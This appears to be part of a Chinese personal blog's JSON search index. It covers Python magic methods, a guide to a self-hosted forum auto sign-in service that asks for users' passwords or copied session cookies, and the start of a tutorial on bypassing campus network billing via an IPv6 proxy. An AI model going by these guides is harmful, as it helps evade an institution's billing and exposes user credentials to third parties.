\u4ee3\u7801\u4e2d\u80fd\u89c1\u5230\u7684\u51e0\u4e4e\u6240\u6709\u8fd0\u7b97\u7b26\u90fd\u53ef\u4ee5\u65e0\u9700\u987e\u8651\u5730\u76f4\u63a5\u91cd\u8f7d\uff08\u8d4b\u503c\u8fd0\u7b97\u7b26 <code>=</code> \u9664\u5916\uff09\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u552f\u72ec\u53ea\u6709 Python \u5c06 <code>\u8fd0\u7b97\u7b26\u91cd\u8f7d</code> \u79f0\u4e3a <code>\u9b54\u6cd5\u65b9\u6cd5</code>\u3002</p> <p>\u9664\u4e86\u90a3\u4e9b\u5927\u90e8\u5206\u8bed\u8a00\u90fd\u53ef\u4ee5\u5b9e\u73b0\u7684\u7ecf\u5178\u8fd0\u7b97\u7b26\u91cd\u8f7d\u5916\uff0c\u4f60\u8fd8\u53ef\u4ee5\uff1a</p> <ul> <li>\u903b\u8f91\u8fd0\u7b97\u7b26\u91cd\u8f7d\uff1a\u4f8b\u5982\u4f7f\u7528 <code>__xor__(self, other)</code> \u91cd\u65b0\u5b9a\u4e49\u5b9e\u73b0\u6309\u4f4d\u5f02\u6216\u8fd0\u7b97\u7b26 <code>^</code> \u7684\u884c\u4e3a\u3002</li> <li>\u589e\u5f3a\u8d4b\u503c\u8fd0\u7b97\u7b26\u91cd\u8f7d\uff1a\u4f8b\u5982\u4f7f\u7528 <code>__iadd__(self, other)</code> \u91cd\u65b0\u5b9a\u4e49 <code>+=</code> \u7684\u884c\u4e3a\u3002</li> <li>\u4e00\u5143\u64cd\u4f5c\u7b26\u91cd\u8f7d\uff1a\u4f8b\u5982\u4f7f\u7528 <code>__neg__(self)</code> \u65b9\u6cd5\u91cd\u65b0\u5b9a\u4e49\u53d6\u8d1f\u64cd\u4f5c <code>-xxx</code> \u7684\u884c\u4e3a\uff1b\u4f8b\u5982\u4f7f\u7528<code>__abs__(self)</code> \u65b9\u6cd5\u91cd\u65b0\u5b9a\u4e49\u8be5\u5bf9\u8c61\u88ab\u7edd\u5bf9\u503c\u51fd\u6570 <code>abs()</code> \u8c03\u7528\u65f6\u7684\u884c\u4e3a</li> <li>\u7c7b\u578b\u8f6c\u6362\u64cd\u4f5c\u7b26\u91cd\u8f7d\uff1a\u4f8b\u5982\u4f7f\u7528 <code>__int__(self)</code> \u65b9\u6cd5\u91cd\u65b0\u5b9a\u4e49\u8be5\u5bf9\u8c61\u88ab\u53d6\u6574\u51fd\u6570 <code>int()</code> \u8c03\u7528\u65f6\u7684\u884c\u4e3a\uff0c<code>__str__(self)</code> \u7b49\u540c\u7406\u3002</li> <li>\u8bbf\u95ee\u63a7\u5236\u64cd\u4f5c\u7b26\u91cd\u8f7d\uff1a\u4f8b\u5982\u4f7f\u7528 <code>__getattr__(self, item)</code> \u65b9\u6cd5\u91cd\u65b0\u5b9a\u4e49 <code>.</code> \u7684\u884c\u4e3a\uff0c\u5f53\u4e14\u4ec5\u5f53\u7528\u6237\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u65f6\u89e6\u53d1\uff0c <code>__setattr__(self, key, value)</code> \u7b49\u540c\u7406\u3002</li> <li>\u5e8f\u5217\u64cd\u4f5c\u7b26\u91cd\u8f7d\uff1a\u4f8b\u5982\u4f7f\u7528 <code>__getitem__(self, key)</code> \u65b9\u6cd5\u91cd\u65b0\u5b9a\u4e49 <code>[</code> \u7684\u884c\u4e3a\uff0c<code>__setitem__(self, key, value)</code> \u7b49\u540c\u7406\u3002</li> <li>...</li> </ul> <p>\u9664\u4e86\u4e0a\u9762\u63d0\u5230\u7684\u8fd0\u7b97\u7b26\u91cd\u8f7d\u4ee5\u5916\uff0c\u4f60\u8fd8\u53ef\u4ee5\uff1a</p> <ul> <li>\u6210\u5458\u8fd0\u7b97\u7b26\u91cd\u8f7d\uff1a\u4f7f\u7528 <code>__contains__(self, item)</code> \u65b9\u6cd5\u91cd\u65b0\u5b9a\u4e49\u6210\u5458\u8fd0\u7b97\u7b26 <code>in</code> \u7684\u884c\u4e3a\u3002</li> <li>\u53ef\u8c03\u7528\u5bf9\u8c61\u64cd\u4f5c\u7b26\u91cd\u8f7d\uff1a\u4f8b\u5982\u4f7f\u7528 <code>__call__(self, *args, **kwargs)</code> \u65b9\u6cd5\u91cd\u65b0\u5b9a\u4e49\u8be5\u5bf9\u8c61\u88ab\u8c03\u7528\u65f6\u7684\u884c\u4e3a\u3002</li> <li>\u53d8\u8eab\u6210\u4e3a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff1a\u5b9a\u4e49 <code>__enter__(self)</code> \u548c <code>__exit__(self, exception_type, exception_value, traceback)</code> \u65b9\u6cd5\u540e\uff0c\u53ef\u5bf9\u8be5\u5bf9\u8c61\u4f7f\u7528 <code>with</code> \u8bed\u53e5\u3002\uff08\u5f02\u6b65\u65f6\u4f7f\u7528 <code>__aenter__</code> \u548c <code>__aexit__</code>\uff09</li> <li>\u53d8\u8eab\u6210\u4e3a\u534f\u7a0b\uff1a\u5b9a\u4e49\u4e86 <code>__await__(self)</code> \u65b9\u6cd5\u7684\u5bf9\u8c61\u662f\u53ef\u7b49\u5f85\u5bf9\u8c61\u3002</li> <li>\u521b\u5efa\u63cf\u8ff0\u7b26\u5bf9\u8c61\uff1a\u4f8b\u5982\u4f7f\u7528 <code>__get__(self, instance, owner)</code> \u5b9a\u4e49\u5f53\u8bd5\u56fe\u53d6\u51fa\u63cf\u8ff0\u7b26\uff08\u7c7b\u5c5e\u6027\u6216\u5b9e\u4f8b\u5c5e\u6027\uff09\u7684\u503c\u65f6\u7684\u884c\u4e3a\u3002</li> <li>...</li> </ul> <p>\uff08\u4e0a\u8ff0\u63d0\u5230\u7684\u9b54\u6cd5\u65b9\u6cd5\u4ec5\u4ec5\u662f Python \u6240\u6709\u7684\u9b54\u6cd5\u65b9\u6cd5\u4e2d\u7684\u51b0\u5c71\u4e00\u89d2\uff0c\u5982\u679c\u611f\u5174\u8da3\u53ef\u4ee5\u53c2\u8003\u5b98\u65b9 \u6587\u6863\uff09</p> <p>\u548c 3.1 \u4f7f\u7528\u4f18\u7f8e\u7684\u73b0\u6709\u65b9\u6cd5\u53d6\u4ee3\u4e11\u964b\u7684\u81ea\u884c\u5b9e\u73b0 \u4e2d\u63d0\u5230\u7684\u5e76\u65e0\u51b2\u7a81\uff0c\u672c\u8282\u6240\u8ff0\u7684\u5185\u5bb9\u662f\u4e0d\u8981\u6ee5\u7528\u9b54\u6cd5\u65b9\u6cd5\u3002\u5982\u679c\u4f60\u4e3a\u4e86\u5b9e\u73b0\u4e00\u4e2a\u76ee\u6807\u9700\u8981\u5927\u91cf\u5730\u4f7f\u7528\u9b54\u6cd5\u65b9\u6cd5\uff0c\u6216\u8bb8\u4f60\u5e94\u8be5\u8003\u8651\u4e00\u4e0b Python \u6807\u51c6\u5e93\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u3002</p> <p>\u4f8b\u5982\u4f60\u9700\u8981\u91cd\u8f7d\u5927\u91cf\u5e8f\u5217\u64cd\u4f5c\u7b26\u548c\u5173\u7cfb\u8fd0\u7b97\u7b26\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u6570\u636e\u7ed3\u6784\u3002\u53ef\u662f\u4f60\u6709\u6ca1\u6709\u60f3\u8fc7\u4e00\u79cd\u53ef\u80fd\u2014\u2014\u8bf4\u4e0d\u5b9a\u4f60\u6240\u9700\u8981\u5b9e\u73b0\u7684\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u65e9\u5c31\u5728 Python \u6807\u51c6\u5e93 <code>collections</code> \u91cc\u5e2e\u4f60\u5b9a\u4e49\u597d\u4e86\u5462\uff1f</p> <p>\u4f5c\u4e3a\u4e00\u4e2a Python \u5f00\u53d1\u8005\uff0c\u8fd9\u4e9b\u9b54\u6cd5\u65b9\u6cd5\u4e3a\u6211\u4eec\u7684\u4ee3\u7801\u5e26\u6765\u4e86\u51e0\u4e4e\u65e0\u9650\u7684\u53ef\u80fd\u6027\uff0c\u90a3\u65e0\u4e0e\u4f26\u6bd4\u7684\u5f3a\u5927\u7684\u529f\u80fd\u8ba9\u6211\u4eec\u4e0d\u518d\u60e7\u6015\u4efb\u4f55\u96be\u4ee5\u5b9e\u73b0\u7684\u76ee\u6807\u3002</p> <p>\u7136\u800c\uff0c\u80fd\u529b\u8d8a\u5f3a\u8d23\u4efb\u8d8a\u5927\uff0c\u77e5\u9053\u8fd9\u4e9b\u9b54\u6cd5\u65b9\u6cd5\u4ec0\u4e48\u65f6\u5019\u8be5\u7528\uff0c\u4ec0\u4e48\u65f6\u5019\u4e0d\u8be5\u7528\uff0c\u5bf9\u4e8e\u6211\u4eec\u6765\u8bf4\u624d\u662f\u6700\u91cd\u8981\u7684\u3002</p> <p>\u5c31\u50cf\u529f\u592b\u5927\u5e08\u4e00\u6837\uff0c\u4e00\u4e2a Pythonista \u77e5\u9053\u5982\u4f55\u7528\u4e00\u4e2a\u624b\u6307\u6740\u6b7b\u5bf9\u65b9\uff0c\u4f46\u4ed6\u4ece\u4e0d\u4f1a\u90a3\u4e48\u53bb\u505a\u3002</p>","tags":["python"]},{"location":"blog/2022/220530-auto-sign-in-guide/","title":"\u81ea\u52a8\u7b7e\u5230\u4f7f\u7528\u6307\u5357","text":"<p>\u6458\u8981</p> <p>\u6211\u7684\u670d\u52a1\u5668\u4e0a\u642d\u5efa\u4e86\u4e00\u4e2a \u81ea\u52a8\u7b7e\u5230\u670d\u52a1\uff0c\u6709\u7fa4\u53cb\u8bf4\u4e0d\u4f1a\u7528\uff0c\u6211\u5c31\u5199\u4e86\u4e2a\u6307\u5357\u3002</p> <p>\u591a\u56fe\u8b66\u544a</p>","tags":["guide"]},{"location":"blog/2022/220530-auto-sign-in-guide/#_1","title":"\u4e00\u3001\u7eea\u8bba","text":"","tags":["guide"]},{"location":"blog/2022/220530-auto-sign-in-guide/#11","title":"1.1 \u8fd9\u662f\u4ec0\u4e48","text":"<p>\u73b0\u4eca\u5f88\u591a\u7f51\u7ad9\u6216\u8bba\u575b\u90fd\u6709\u7b7e\u5230\u529f\u80fd\uff0c\u901a\u8fc7\u6bcf\u65e5\u7b7e\u5230\u53ef\u4ee5\u83b7\u53d6\u5c11\u91cf\u79ef\u5206\u3001\u91d1\u5e01\u7b49\u9053\u5177\uff0c\u67d0\u4e9b\u7f51\u7ad9\u6216\u8bba\u575b\u8fde\u7eed\u7b7e\u5230\u53ef\u4ee5\u83b7\u5f97\u66f4\u4e30\u5bcc\u7684\u5956\u52b1\u3002</p> <p>\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u6bcf\u6b21\u90fd\u8981\u624b\u52a8\u53bb\u7f51\u9875\u4e0a\u7b7e\u5230\u5c82\u4e0d\u662f\u5f88\u6d6a\u8d39\u65f6\u95f4\uff1f\u8fd9\u4e48\u591a\u4e2a\u7f51\u7ad9\uff0c\u6bcf\u6b21\u90fd\u53bb\u4e00\u4e2a\u4e00\u4e2a\u7b7e\u5c82\u4e0d\u662f\u5f88\u9ebb\u70e6\uff1f\u4e07\u4e00\u65ad\u7b7e\u4e86\u600e\u4e48\u529e\uff1f\u4e8e\u662f\u5c31\u6709\u4e86 <code>\u81ea\u52a8\u7b7e\u5230\u670d\u52a1</code> \u8fd9\u4e2a\u4e1c\u897f\u3002</p> <p><code>\u81ea\u52a8\u7b7e\u5230\u670d\u52a1</code> \u7684\u7528\u9014\u548c\u4ed6\u7684\u540d\u5b57\u4e00\u6a21\u4e00\u6837\uff0c\u90a3\u5c31\u662f\u901a\u8fc7\u6211\u7684\u670d\u52a1\u5668\u901a\u8fc7\u6a21\u62df\u767b\u5f55\u3001\u7b7e\u5230\u7b49\u64cd\u4f5c\uff0c\u81ea\u52a8\u66ff\u4f60\u5b8c\u6210\u6bcf\u65e5\u7b7e\u5230\u3002</p>","tags":["guide"]},{"location":"blog/2022/220530-auto-sign-in-guide/#12","title":"1.2 \u5165\u53e3","text":"<p>\u672c\u670d\u52a1\u88ab\u642d\u5efa\u5728 https://qiandao.arisa.moe/ \u4e0a\u3002</p>","tags":["guide"]},{"location":"blog/2022/220530-auto-sign-in-guide/#13","title":"1.3 \u8bb8\u53ef\u8bc1","text":"<p>\u672c\u670d\u52a1\u57fa\u4e8e qiandao-today/qiandao \u9879\u76ee\uff0c\u8be5\u9879\u76ee\u91c7\u7528 MIT \u8bb8\u53ef\u8bc1\u5f00\u6e90\u3002</p> <p>\u672c\u670d\u52a1\u6240\u4f7f\u7528\u7684\u6a21\u677f\u5747\u57fa\u4e8e qiandao-today/templates\u3002</p>","tags":["guide"]},{"location":"blog/2022/220530-auto-sign-in-guide/#_2","title":"\u4e8c\u3001\u6ce8\u518c","text":"<p>\u5728\u4f7f\u7528\u8be5\u670d\u52a1\u524d\uff0c\u9700\u8981\u5148\u82b15\u79d2\u949f\u7684\u65f6\u95f4\u5728\u6211\u7684\u7f51\u7ad9\u4e0a\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u3002</p> <p></p> <p>\u53f3\u4e0a\u89d2\u9009\u62e9 <code>\u767b\u5f55</code> \u6309\u94ae\uff0c\u7136\u540e\u8f93\u5165\u4f60\u81ea\u5df1\u7684\u90ae\u7bb1\uff08\u65e0\u987b\u9a8c\u8bc1\u90ae\u7bb1\uff09\u548c\u5bc6\u7801\uff0c\u70b9\u51fb <code>\u6ce8\u518c</code> \u5373\u53ef\u3002</p> <p></p>","tags":["guide"]},{"location":"blog/2022/220530-auto-sign-in-guide/#_3","title":"\u4e09\u3001\u6dfb\u52a0\u6a21\u677f","text":"<p>\u6ce8\u518c\u5b8c\u4e4b\u540e\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\u4f60\u7684\u4eea\u8868\u76d8\u3002\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u4f46\u662f\u73b0\u5728\u4f60\u7684\u4eea\u8868\u76d8\u5b8c\u5168\u662f\u7a7a\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u4f60\u8fd8\u6ca1\u6709\u6dfb\u52a0\u4efb\u4f55\u6a21\u677f\u548c\u7b7e\u5230\u4efb\u52a1\u3002</p> <p>\u90a3\u4e48\u73b0\u5728\u6765\u6dfb\u52a0\u4e00\u4e9b\u6a21\u677f\uff0c\u5982\u56fe\u70b9\u51fb <code>\u516c\u5171\u6a21\u677f</code>\u3002</p> <p></p> <p>\u4f60\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u516c\u5171\u6a21\u677f\uff0c\u8fd9\u4e9b\u90fd\u662f\u4ece qiandao-today/templates \u9879\u76ee\u83b7\u53d6\u7684\u3002\u9009\u4e2d\u4e00\u4e2a\u4f60\u60f3\u8981\u6dfb\u52a0\u7684\u6a21\u677f\uff0c\u70b9\u51fb\u5de6\u8fb9\u7684 <code>\u8ba2\u9605</code>\u3002</p> <p></p> <p>\u8ba2\u9605\u4e4b\u540e\u4f60\u4f1a\u770b\u5230\u4e00\u4e2a\u7528\u4e8e\u7f16\u8f91\u6a21\u677f\u7684\u754c\u9762\uff0c\u6b64\u65f6\u65e0\u987b\u7ba1\u4ed6\uff0c\u76f4\u63a5\u4fdd\u5b58\u5373\u53ef\u3002</p> <p></p> <p>\u968f\u540e\u4f1a\u51fa\u73b0\u4e00\u4e2a <code>\u4fdd\u5b58HAR</code> \u7684\u754c\u9762\uff0c\u8fd9\u91cc\u4e5f\u662f\u76f4\u63a5\u70b9 <code>\u4fdd\u5b58</code> \u5373\u53ef\uff0c\u4e0d\u9700\u8981\u4f60\u6539\u4efb\u4f55\u4e1c\u897f\uff08\u60f3\u6539\u4e5f\u884c\uff09\u3002</p> <p></p> <p>\u6b64\u65f6\u56de\u5230\u4f60\u7684\u4eea\u8868\u76d8\uff0c\u4f60\u4f1a\u53d1\u73b0\u4f60\u7684\u6a21\u677f\u5df2\u7ecf\u6dfb\u52a0\u5230\u4e86 <code>\u6211\u7684\u6a21\u677f</code> \u5217\u8868\u4e2d\u3002</p> <p></p>","tags":["guide"]},{"location":"blog/2022/220530-auto-sign-in-guide/#_4","title":"\u56db\u3001\u6dfb\u52a0\u4efb\u52a1","text":"<p>\u521a\u521a\u6211\u4eec\u505a\u7684\u53ea\u662f\u5c06\u4e00\u4e2a\u6a21\u677f\u4ece\u516c\u5171\u6a21\u677f\u5e93\u4e2d\u590d\u5236\u5230\u4f60\u81ea\u5df1\u7684\u6211\u7684\u6a21\u677f\u4e2d\uff08\u8fd9\u6837\u4fbf\u4e8e\u540e\u671f\u81ea\u5df1\u81ea\u5b9a\u4e49\u6a21\u677f\uff09\u3002\u73b0\u5728\u8981\u505a\u7684\u5c31\u662f\u57fa\u4e8e\u8fd9\u4e2a\u6a21\u677f\u521b\u5efa\u4e00\u4e2a\u7b7e\u5230\u4efb\u52a1\u3002</p> <p>\u70b9\u51fb\u6a21\u677f\u672b\u5c3e\u7684 <code>\u65b0\u5efa</code> \u6309\u94ae\u3002</p> <p></p> <p>\u5728\u8fd9\u4e2a\u754c\u9762\u91cc\u8f93\u5165\u4f60\u5728\u5bf9\u5e94\u8bba\u575b\u4e0a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff08\u7ea2\u6846\uff09\u3002\u5982\u679c\u8fd9\u91cc\u8981\u6c42\u7684\u662f\u9996\u9875 Cookies\uff0c\u90a3\u4e48\u8bf7\u53c2\u8003 \u8fd9\u91cc \u83b7\u53d6\u3002</p> <p>\u5907\u6ce8\u91cc\u968f\u4fbf\u586b\u5199\u4e00\u70b9\u4e1c\u897f\uff08\u84dd\u6846\uff09\uff0c\u7528\u6765\u5728\u4f60\u81ea\u5df1\u7684\u4eea\u8868\u76d8\u4e0a\u505a\u5907\u6ce8\uff0c\u6211\u81ea\u5df1\u586b\u7684\u662f\u5bf9\u5e94\u8bba\u575b\u4e0a\u7684\u7528\u6237\u540d\uff0c\u56e0\u4e3a\u6211\u5728\u540c\u4e00\u4e2a\u8bba\u575b\u4e0a\u6709\u597d\u51e0\u4e2a\u53f7\uff0c\u521b\u5efa\u4efb\u52a1\u7684\u65f6\u5019\u9700\u8981\u7528\u7528\u6237\u540d\u533a\u5206\u3002\u5f53\u7136\u8fd9\u91cc\u4f60\u7559\u7a7a\u4e5f\u884c\u3002</p> <p>\u5982\u679c\u4f60\u5f53\u5929\u5df2\u7ecf\u7b7e\u5230\u8fc7\u4e00\u6b21\u4e86\uff0c\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u7b7e\u5230\uff0c\u4f60\u53ef\u4ee5\u628a\u4e0b\u9762\u7684 <code>\u6211\u4eca\u5929\u5df2\u7ecf\u7b7e\u8fc7\u5230\u4e86</code> \u7ed9\u52fe\u4e0a\uff0c\u8fd9\u6837\u70b9\u51fb\u63d0\u4ea4\u4e4b\u540e\u5c31\u4e0d\u4f1a\u81ea\u52a8\u8fdb\u884c\u4e00\u6b21\u7b7e\u5230\u3002</p> <p></p> <p>\u5176\u4ed6\u7684\u4e1c\u897f\u90fd\u4e0d\u9700\u8981\u7ba1\uff0c\u6700\u540e\u70b9\u51fb <code>\u63d0\u4ea4</code>\u3002\u63d0\u4ea4\u4e4b\u540e\uff0c\u81ea\u52a8\u7b7e\u5230\u670d\u52a1\u4f1a\u7acb\u5373\u5c1d\u8bd5\u4e00\u6b21\u7b7e\u5230\u3002</p> <p></p>","tags":["guide"]},{"location":"blog/2022/220530-auto-sign-in-guide/#_5","title":"\u4e94\u3001\u4fee\u6539\u4efb\u52a1\u5b9a\u65f6","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e0b\u4e00\u6b21\u7684\u7b7e\u5230\u65f6\u95f4\u4f1a\u662f\u4e0a\u4e00\u6b21\u7b7e\u5230\u6210\u529f\u7684\u65f6\u95f4\u52a0\u4e0a24\u4e2a\u5c0f\u65f6\u3002</p> <p>\u5982\u679c\u4f60\u6bd4\u8f83\u5728\u610f\u8fd9\u4e2a\uff0c\u6216\u8005\u662f\u8ddf\u6211\u4e00\u6837\u6709\u5f3a\u8feb\u503e\u5411\uff08\u4f8b\u5982\u60f3\u8981\u7edf\u4e00\u5728\u65e9\u4e0a\u7b7e\u5230\uff09\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u901a\u8fc7\u7f16\u8f91\u4efb\u52a1\u7684\u5b9a\u65f6\u6765\u5b9e\u73b0\u3002</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e2a\u793a\u4f8b\uff0c\u6211\u5c06\u4f1a\u628a\u521a\u521a\u6dfb\u52a0\u7684\u90a3\u4e2a\u4efb\u52a1\u7684\u5b9a\u65f6\u4fee\u6539\u6210\u5728 <code>\u6bcf\u5929\u65e9\u4e0a 6:00 ~ 9:00</code> \u8fdb\u884c\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u6765\u4fee\u6539\u3002</p> <p>\u9996\u5148\u70b9\u51fb\u4efb\u52a1\u672b\u5c3e\u7684 <code>\u5b9a\u65f6</code> \u6309\u94ae\u3002</p> <p></p> <p>\u6b64\u65f6\u4f1a\u51fa\u73b0\u4e00\u4e2a\u5b9a\u65f6\u754c\u9762\u4fee\u6539\u6846\u3002</p> <p></p> <p>\u7136\u540e\u6211\u4eec\u628a <code>\u5b9a\u65f6\u5f00\u5173</code> \u548c <code>\u5f53\u5929\u968f\u673a\u5ef6\u65f6\u533a\u95f4</code> \u8fd9\u4e24\u4e2a\u52fe\u7ed9\u52fe\u4e0a\uff0c\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u5728\u6bcf\u5929\u65e9\u4e0a\u7684 6:00 ~ 9:00 \u4e4b\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u65f6\u95f4\u8fdb\u884c\u7b7e\u5230\uff0c\u800c\u4e0d\u662f\u6bcf\u6b21\u5411\u540e\u987a\u5ef624\u5c0f\u65f6\u3002</p> <ul> <li>\u5b9a\u65f6\u5f00\u5173\uff1a<ul> <li>\u5f00\uff1a\u6bcf\u5929\u56fa\u5b9a\u65f6\u95f4\u7b7e\u5230</li> <li>\u5173\uff1a\u4e0a\u4e00\u6b21\u7b7e\u5230\u6210\u529f\u7684\u65f6\u95f4\u987a\u5ef624\u4e2a\u5c0f\u65f6</li> </ul> </li> <li>\u5f53\u5929\u968f\u673a\u5ef6\u65f6\u533a\u95f4\uff1a<ul> <li>\u5f00\uff1a\u6bcf\u6b21\u968f\u673a\u5411\u540e\u5ef6\u65f6</li> <li>\u5173\uff1a\u4e0d\u968f\u673a\u5ef6\u65f6\uff0c\u771f\u6b63\u7684\u56fa\u5b9a\u65f6\u95f4</li> </ul> </li> </ul> <p>\u6211\u505a\u6f14\u793a\u7684\u65f6\u5019\uff0c\u5f53\u5929\u662f <code>2022\u5e746\u67085\u65e5</code>\uff0c\u6240\u4ee5\u8fd9\u91cc\u9ed8\u8ba4\u663e\u793a\u7684\u65e5\u671f\u4e5f\u662f <code>2022\u5e746\u67085\u65e5</code>\u3002\u56e0\u4e3a\u6211\u4eec\u4eca\u5929\u5df2\u7ecf\u7b7e\u5230\u8fc7\u4e00\u6b21\u4e86\uff0c\u5e0c\u671b\u4ed6\u4ece\u660e\u5929\u5f00\u59cb\uff0c\u6240\u4ee5\u628a\u8fd9\u4e2a\u65e5\u671f\u6539\u6210 <code>2022\u5e746\u67086\u65e5</code>\u3002</p> <p>\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u5728\u6bcf\u5929\u65e9\u4e0a\u7684 6:00 ~ 9:00 \u4e4b\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u65f6\u95f4\u8fdb\u884c\u7b7e\u5230\uff0c\u6240\u4ee5\u628a\u540e\u9762\u7684\u65f6\u95f4\u6539\u4e3a <code>06:00:00</code>\uff0c\u5ef6\u65f6\u533a\u95f4\u6539\u4e3a <code>0~10800</code>\uff08\u4e5f\u5c31\u662f3\u4e2a\u5c0f\u65f6\uff09\u3002</p> <p>\u6700\u540e\u6211\u4eec\u6539\u5b8c\u662f\u8fd9\u6837\u7684\uff1a</p> <p></p> <p>\u70b9\u51fb <code>\u63d0\u4ea4</code> \u5373\u53ef\u3002</p> <p>\u5237\u65b0\u4e00\u4e0b\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u4efb\u52a1\u7684\u65f6\u95f4\u5df2\u7ecf\u53d8\u6210\u4e86\u65e9\u4e0a6\u70b9\u52309\u70b9\u4e2d\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u503c\u3002</p> <p></p>","tags":["guide"]},{"location":"blog/2022/220530-auto-sign-in-guide/#cookies","title":"\u516d\u3001\u5982\u4f55\u521b\u5efa\u4ee5 Cookies \u4f5c\u4e3a\u767b\u9646\u65b9\u5f0f\u7684\u7b7e\u5230\u4efb\u52a1","text":"<p>\u6709\u5f88\u591a\u7c7b\u4f3c\u4e8e\u8fd9\u6837\u5b50\u7684\u6a21\u677f\uff0c\u5b83\u8981\u6c42\u63d0\u4f9b Cookies\uff0c\u800c\u4e0d\u662f\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002</p> <p></p> <p>\u4e0b\u9762\u5c06\u4ee5 https://www.bilibili.com/ \u4e3a\u4f8b\uff0c\u5c55\u793a\u5982\u4f55\u83b7\u53d6\u9996\u9875 Cookies\u3002</p> <p>\u9996\u5148\u8fdb\u5165 B \u7ad9\u9996\u9875\uff0c\u6309\u4e0b F12 \u5f00\u542f\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u8005\u63a7\u5236\u53f0\u3002\u5207\u6362\u5230 <code>\u7f51\u7edc</code> \u9009\u9879\u5361\uff08\u6216\u8005 <code>Network</code> \u9009\u9879\u5361\uff09\u3002</p> <p></p> <p>\u6309\u4e0b F5 \u5237\u65b0\u9875\u9762\uff0c\u6b64\u65f6\u8fd9\u91cc\u5e94\u8be5\u4f1a\u51fa\u73b0\u5f88\u591a\u8bf7\u6c42\u3002\u9009\u62e9\u7b2c\u4e00\u4e2a\uff0c\u67e5\u770b\u5b83\u7684\u8bf7\u6c42\u5934\uff0c\u627e\u5230 Cookies\u3002</p> <p></p> <p>\u590d\u5236 Cookies \u5373\u53ef\uff08\u6ce8\u610f\u662f\u590d\u5236 Cookies \u7684\u5185\u5bb9\uff0c\u4e0d\u8981\u628a <code>Cookie</code> \u8fd9\u51e0\u4e2a\u5b57\u6bcd\u4e5f\u590d\u5236\u8fc7\u53bb\u4e86\uff09</p>","tags":["guide"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/","title":"\u67b6\u8bbe\u53cc\u6808\u4ee3\u7406\u670d\u52a1\u5668\u901a\u8fc7 IPv6 \u7ed5\u8fc7\u6821\u56ed\u7f51\u8ba1\u8d39\u7cfb\u7edf\u7684\u65b9\u6cd5","text":"<p>\u6458\u8981</p> <p>\u5728\u67d0\u4e9b\u6821\u56ed\u7f51\u8ba1\u8d39\u7cfb\u7edf\u4e2d\uff0cIPv6 \u5730\u5740\u662f\u4e0d\u8ba1\u5165\u6821\u56ed\u7f51\u6d41\u91cf\u7684\u3002\u8fd9\u91cc\u63d0\u4f9b\u4e86\u4e00\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u901a\u8fc7\u67b6\u8bbe IPv6 \u4ee3\u7406\u7ed5\u8fc7\u6821\u56ed\u7f51\u8ba1\u8d39\u7cfb\u7edf\uff0c\u4ece\u800c\u5b9e\u73b0\u514d\u6d41\u4e0a\u7f51\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#1","title":"\u7b2c 1 \u7ae0 \u514d\u6d41\u7406\u8bba\u57fa\u7840","text":"<p>\u63d0\u793a</p> <p>\u5982\u679c\u4f60\u7684\u540c\u5b66\u6709\u6309\u7167\u6b64\u6559\u7a0b\u642d\u5efa\u7684\u73b0\u6210\u7684\u514d\u6d41\u670d\u52a1\u5668\uff0c\u90a3\u4f60\u9605\u8bfb\u5b8c\u8fd9\u4e00\u7ae0\u4e4b\u540e\u53ef\u4ee5\u76f4\u63a5\u8df3\u8fc7\u5e76\u5feb\u8fdb\u5230 3.3 \u914d\u7f6e\u5ba2\u6237\u7aef\uff08Client\uff09\uff0c\u5e76\u5411\u4ed6\u4eec\u8be2\u95ee\u76f8\u5173\u7684\u914d\u7f6e\u65b9\u6cd5\u3002</p> <p>\u5982\u679c\u4f60\u5468\u56f4\u6ca1\u6709\u4efb\u4f55\u540c\u5b66\u6309\u6b64\u6559\u7a0b\u642d\u5efa\u670d\u52a1\u5668\uff0c\u6216\u8005\u4f60\u60f3\u4ece\u96f6\u5f00\u59cb\u5b8c\u5168\u52a8\u624b\u81ea\u5efa\u4e00\u4e2a\u5c5e\u4e8e\u81ea\u5df1\u7684\u514d\u6d41\u670d\u52a1\u5668\uff0c\u90a3\u4f60\u53ef\u80fd\u9700\u8981\u5168\u6587\u9605\u8bfb\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#11","title":"1.1 \u524d\u8a00\u548c\u51c6\u5907","text":"<p>\u5728\u5f00\u59cb\u4e4b\u524d\uff0c\u4f60\u9700\u8981\uff1a</p> <ul> <li> IPv6 \u516c\u7f51\uff08\u89c1 1.3 IPv6 \u73af\u5883\uff09</li> <li> \u80fd\u987a\u5229\u8bbf\u95ee GitHub\uff08\u5bf9\u4e8e Android \u548c Windows 10 \u7528\u6237\uff09</li> <li> \u62e5\u6709\u4e00\u4e2a\u975e\u56fd\u533a iCloud 